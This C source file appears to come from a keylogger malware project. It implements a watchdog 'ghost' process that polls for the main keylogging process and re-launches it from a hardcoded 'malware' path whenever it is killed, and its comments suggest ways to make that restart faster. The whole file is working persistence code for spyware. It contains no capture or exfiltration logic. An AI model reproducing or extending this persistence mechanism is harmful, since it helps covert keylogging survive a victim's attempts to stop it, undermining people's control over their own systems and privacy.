/*
 * This will be a ghost process whose only purpose is to start the
 * main keylogging process if it is terminated. Conversely, the main
 * keylogging process will keep track to see if this process is
 * running as well.
 *
 * The current implementation to achieve this is simply polling the
 * proc directory for a certain pid. A better implementation would
 * be able to be notified on any process being killed. That way any
 * process which is killed can be checked to see if it is one of the
 * processes in the malware. This would make the startup of a killed
 * process much faster.
 */

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#include "process.h"

pid_t exec_main();
void* keep_main_alive(void *args);

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        printf("Not enough arguments provided\n");
        exit(1);
    }

    pid_t parent_id = atoi(argv[1]);

    pthread_attr_t attr;
    pthread_attr_init(&attr);

    pthread_t aliver;
    pthread_create(&aliver, &attr, keep_main_alive, &parent_id);

    pthread_join(aliver, NULL);

    return 0;
}

pid_t exec_main()
{
    pid_t parent_id = getpid();
    pid_t pid = fork();
    if (pid < 0)
    {
        printf("There was an error forking. Exiting...\n");
        exit(1);
    }
    else if (pid == 0)
    {
        char str_id[6];
        sprintf(str_id, "%d", parent_id);

        printf("Starting main...\n");
        execlp("/home/matgrioni/malware/./main", "./main", str_id, NULL);
    }

    return pid;
}

void* keep_main_alive(void *args)
{
    pid_t cur_pid = *((int *) args);
    while(1)
    {
        cur_pid = process_periodic_check(cur_pid, 5, -1, exec_main);
        wait(NULL);
    }
}
